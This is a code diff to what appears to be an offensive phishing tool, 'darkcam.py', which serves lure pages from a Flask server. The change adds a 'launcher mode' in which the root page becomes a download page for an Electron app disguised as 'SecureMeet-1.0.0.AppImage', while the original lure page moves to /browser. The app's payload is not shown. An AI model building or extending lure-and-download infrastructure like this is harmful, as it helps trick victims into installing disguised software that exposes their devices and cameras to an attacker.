@@ -371,16 +371,21 @@ def start_flask(page, port):
     t.start()
     time.sleep(1.2)
 
-def start_flask_single(page, port):
+def start_flask_single(page, port, electron_app_path=None):
     script_dir = os.path.dirname(os.path.abspath(__file__))
     sys.path.insert(0, script_dir)
     import server as srv
-    srv.app.config["LURE_PAGE"] = page
-    # Always use templates/static from darkcam.py's own directory,
-    # regardless of where server.py was found on sys.path
     from jinja2 import FileSystemLoader
     srv.app.jinja_loader = FileSystemLoader(os.path.join(script_dir, "templates"))
     srv.app.static_folder = os.path.join(script_dir, "static")
+
+    if electron_app_path and os.path.exists(electron_app_path):
+        # Launcher mode: / shows download page, /browser shows lure
+        srv.app.config["LURE_PAGE"]         = "launcher"
+        srv.app.config["BROWSER_LURE_PAGE"] = page
+        srv.app.config["ELECTRON_APP_PATH"] = electron_app_path
+    else:
+        srv.app.config["LURE_PAGE"] = page
 
     def run():
         srv.socketio.run(srv.app, host="0.0.0.0", port=port,
@@ -567,7 +572,16 @@ def main():
         subprocess.run(f"kill $(lsof -ti:{port}) 2>/dev/null", shell=True)
         time.sleep(0.3)
         print(f"  {_G}[+]{_R} Starting Flask server on port {port}...")
-        start_flask_single(page, port)
+        electron_app = None
+        if args.electron:
+            _appimage = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                     "electron", "dist", "SecureMeet-1.0.0.AppImage")
+            if os.path.exists(_appimage):
+                electron_app = _appimage
+                print(f"  {_G}[+]{_R} Launcher mode: AppImage found → {_appimage}")
+            else:
+                print(f"  {_O}[!]{_R} AppImage not found — build it first: cd electron && ./build.sh <URL>")
+        start_flask_single(page, port, electron_app_path=electron_app)
         print(f"  {_G}[+]{_R} Flask server running.")
 
         public_url = f"http://localhost:{port}"
